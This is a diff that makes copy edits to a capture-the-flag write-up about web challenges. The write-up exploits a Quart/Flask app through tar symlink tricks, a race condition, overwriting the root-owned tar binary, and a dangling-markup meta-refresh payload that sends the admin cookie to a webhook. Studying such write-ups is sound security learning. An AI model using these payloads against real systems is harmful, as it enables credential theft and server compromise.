@@ -1,5 +1,5 @@
-Solves: S.K.I.B.I.D.I. (web), EasyXSSChallenge(web),  S.K.I.B.I.D.I. Revenge(web), Touch Grass(Physical)
-I was able to first blood all 3 web challenges and was the reason  S.K.I.B.I.D.I. got a revenge challenge :D
+Solves: S.K.I.B.I.D.I. (web), EasyXSSChallenge(web), S.K.I.B.I.D.I. Revenge(web), Touch Grass(Physical)
+I was able to first blood all 3 web challenges and was the reason S.K.I.B.I.D.I. got a revenge challenge :D
 ## S.K.I.B.I.D.I.
 #langs/python
 This challenge involved stealing a flag file in `/app/users/admin/flag`, and were given the ability to run various file system commands. The website uses an async version of flask called Quartz and also seems to have some thread pool for running commands. More suspiciously, there is also a middleware that randomly delays requests, hinting at a potential race condition being used.
@@ -55,7 +55,7 @@ async def sandbox():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 ```
-So, what is stopping us from reading the flag directly? Lets review the various methods that we can call.
+So, what is stopping us from reading the flag directly? Let's review the various methods that we can call.
 ```python
 class SkibidiSandBox:
     def __init__(self, base_path, tar_bytes=None, max_workers=4):
@@ -213,14 +213,14 @@ This time, I almost immediately recognised that this code allows us to sneak in 
     # one more time, to be safe
     filename = os.path.basename("".join(filename))
 ```
-[`path.basename()`](https://docs.python.org/3/library/os.path.html#os.path.basename) simply takes the last component of a path(The filename) and returns it, meaning any attempts at path traversal will still be blocked. Next, there is another piece of code which adds a default file extension of `.html` if there isn't already one
+[`path.basename()`](https://docs.python.org/3/library/os.path.html#os.path.basename) simply takes the last component of a path (The filename) and returns it, meaning any attempts at path traversal will still be blocked. Next, there is another piece of code which adds a default file extension of `.html` if there isn't already one
 ```python
     # add a file extension if needed
     if not "." in filename:
         # TODO We can control the file extension
         filename = filename + ".html"
 ```
-This is another suspicious bit because usually, we wouldn't have been able to choose the file extension anyway(If not for that bug above). So far, the vulnerability from the filename handling seems to be being able to pick arbitrary file extensions, which we will return to later. Now, we should go back to review how our templates are handled.
+This is another suspicious bit because usually, we wouldn't have been able to choose the file extension anyway (If not for that bug above). So far, the vulnerability from the filename handling seems to be being able to pick arbitrary file extensions, which we will return to later. Now, we should go back to review how our templates are handled.
 ```python
     # sanitize out html
     content = request.form.get("content")
@@ -232,7 +232,7 @@ This is another suspicious bit because usually, we wouldn't have been able to ch
     # add the title
     content = "{{title}}" + content
 ```
-It seems all `<>{}` gets encoded, effectively preventing us from putting any html tags or template expressions into our template. The valid template expression is the `{{title}}` variable inserted before our content. We seem to have hit a dead end for now, so let's review how the served templates are displayed. We notice that the bot doesn't actually visit `/serve`, but instead `/render`:
+It seems all `<>{}` gets encoded, effectively preventing us from putting any HTML tags or template expressions into our template. The valid template expression is the `{{title}}` variable inserted before our content. We seem to have hit a dead end for now, so let's review how the served templates are displayed. We notice that the bot doesn't actually visit `/serve`, but instead `/render`:
 ```python
 def admin_bot(params):
 	...
@@ -273,7 +273,7 @@ so let's just check what is rendered instead.
 </body>
 </html>
 ```
-Interestingly, nothing much here too, except for some js
+Interestingly, nothing much here too, except for some JS
 ```js
 function getQueryParams() {
   const params = new URLSearchParams(window.location.search);
@@ -301,9 +301,9 @@ Enjoy! :'>`;
   });
 ```
 This is where the template display functionality comes from. The page gets the window's query parameters and assigns them to an object. 
-> It should be noted that the code here is vulnerable to prototype pollution but I couldn't find a way to exploit it.
+> It should be noted that the code here is vulnerable to prototype pollution, but I couldn't find a way to exploit it.
 
-We then get the server to render the actual template based on the filename query parameter, passing on the query parameters too. No sanitisation of the returned content is done and the result is directly put in `innerHTML`. Interestingly, `document.cookie` is appended to our template for some reason, which will be useful later(Hint: Dangling markup). Also, I forgot to mention this earlier but the server does apply a pretty strict CSP, as seen from
+We then get the server to render the actual template based on the filename query parameter, passing on the query parameters too. No sanitisation of the returned content is done, and the result is directly put in `innerHTML`. Interestingly, `document.cookie` is appended to our template for some reason, which will be useful later (Hint: Dangling markup). Also, I forgot to mention this earlier, but the server does apply a pretty strict CSP, as seen from
 ```python
 @app.after_request
 def apply_csp(response):
@@ -311,8 +311,8 @@ def apply_csp(response):
     # script-src 'self' can be problematic if you host JSONP, AngularJS or user uploaded files.
     return response
 ```
-Lets consolidate what we know so far:
-* Strict CSP where we can't run any js
+Let's consolidate what we know so far:
+* Strict CSP where we can't run any JS
 * Being unable to create templates with tags or expressions, except for the `{{title}}` which is added by default
 * Suspicious cookie insert right after the rendered content
 * Very odd bug and file extension check where we can control file extensions
@@ -320,9 +320,9 @@ At this point, I knew with dangling markup, I could steal the flag with a render
 ```html
 <meta http-equiv="refresh" content=\'0; url=https://webhook?x=
 ```
-But how would we get that? I remembered jinja had something where you could mark it as [safe](https://jinja.palletsprojects.com/en/stable/templates/#working-with-automatic-escaping). I was wondering if passing something that wasn't a string to `title` could somehow get it marked as safe when stringified, but a quick gemini chat told me it wasn't possible. But hold up, what and when does Flask consider something is safe? 
+But how would we get that? I remembered jinja had something where you could mark it as [safe](https://jinja.palletsprojects.com/en/stable/templates/#working-with-automatic-escaping). I was wondering if passing something that wasn't a string to `title` could somehow get it marked as safe when stringified, but a quick Gemini chat told me it wasn't possible. But hold up, what and when does Flask consider something is safe? 
 ![[Pasted image 20250801222422.png]] 
-(Thanks gemini)
+(Thanks Gemini)
 Checking the [docs](https://flask.palletsprojects.com/en/stable/templating/#jinja-setup), flask only escapes specific files:
 > "autoescaping is enabled for all templates ending in .html, .htm, .xml, .xhtml, as well as .svg when using render_template()."
 
@@ -331,7 +331,7 @@ In conclusion:
 1. Abuse file name filter to get an extension that flask won't apply auto escaping on
 2. Use dangling markup payload as `title` query parameter to feed to the template
 3. Send report to admin bot with our payload
-4. Template renders the tags properly without any sanitisation and we snag the html(and the inserted cookie) after the payload
+4. Template renders the tags properly without any sanitisation, and we snag the html(and the inserted cookie) after the payload
 ```python
 import httpx
 import uuid
@@ -438,7 +438,7 @@ with httpx.Client() as c:
     print(res.text)  
     res.raise_for_status()  
 ```
-and was already getting my file uploaded rejected with a very sad error 400 : `{"error":"Tar file too large"}`. As it seems, the tar file created was a whole 10kb large, way more than the 100 byte limit given. According to gemini,
+and was already getting my file uploaded rejected with a very sad error 400 : `{"error":"Tar file too large"}`. As it seems, the tar file created was a whole 10kb large, way more than the 100 byte limit given. According to Gemini,
 > The tar (tape archive) utility was originally designed for creating archives on magnetic tapes. Tapes are sequential storage media, and to write to them efficiently, data is written in fixed-size chunks called blocks. The standard tar format uses a block size of 512 bytes. 
 > For each file (or in this case, a symbolic link), tar writes a 512-byte header that contains all the file's metadata, such as its name, permissions, and the target of the symbolic link. After the header, tar writes the file data itself. In the case of a symbolic link, the "data" is just the path it points to. Since a symbolic link's path is usually very short, the actual data is much less than 512 bytes, so tar pads the rest of the block with null bytes to fill it up
 
@@ -516,7 +516,7 @@ with httpx.Client() as c:
     sandbox(c, "cp", ["tmp1", "tmp2/flag"])
 ```
 ![[Pasted image 20250808233043.png]]
-Uhm, where is my flag? I double checked docker and confirmed the flag had indeed been moved.
+Uhm, where is my flag? I double-checked docker and confirmed the flag had indeed been moved.
 ![[Pasted image 20250808233210.png]]
 What is going on? It turns out I had missed a very crucial line in `app.py`:
 ```python
@@ -550,7 +550,7 @@ Hold up, we are running as root?
 ### The infinite power of root
 Being root grants us way more options, including being able to override binaries installed by default, such as `tar`. If we overrode the tar binary and got it to run malicious commands instead, we could perhaps exfiltrate the flag that way. Thankfully, symlinks will not modify the permission of the original file, meaning writing to `tar` through a symlink does not make it lose its executable perms. With this in mind, our new plans are:
 * Upload an executable containing a symlink to `/usr/bin/tar`
-* Override it's contents
+* Override its contents
 * Upload another tar file, causing the `tar` command to be run
 * Profit
 As always, we make the tar then truncate it:
@@ -691,7 +691,7 @@ async def main():
 asyncio.run(main())
 ```
 `sctf{4ctu411y_r4c1ng_1nt0_th3_n1ght_n0w}`
- > I had initially tried to send the flag over a http request but my goofy ahh forgot to url encode the flag. The fact that the payload worked on the local flag for testing but not on remote lead me to believe outbound network requests were disabled or something. So yeah lessons learnt try to test against proper flags(Like flags from other chals maybe). Stealing the flag via http is left as an exercise for the reader (:
+ > I had initially tried to send the flag over a http request but my goofy ahh forgot to URL encode the flag. The fact that the payload worked on the local flag for testing but not on remote lead me to believe outbound network requests were disabled or something. So yeah lessons learnt try to test against proper flags(Like flags from other chals maybe). Stealing the flag via http is left as an exercise for the reader (:
  
 As of writing this writeup, I realised I have taken some inspiration from [[Greyctf 2025#C2]], where other teams overrode the `go` binary too.
 TODO Traversing up/down a symlink is kinda goofy, could perhaps make some ctf chal about it lol
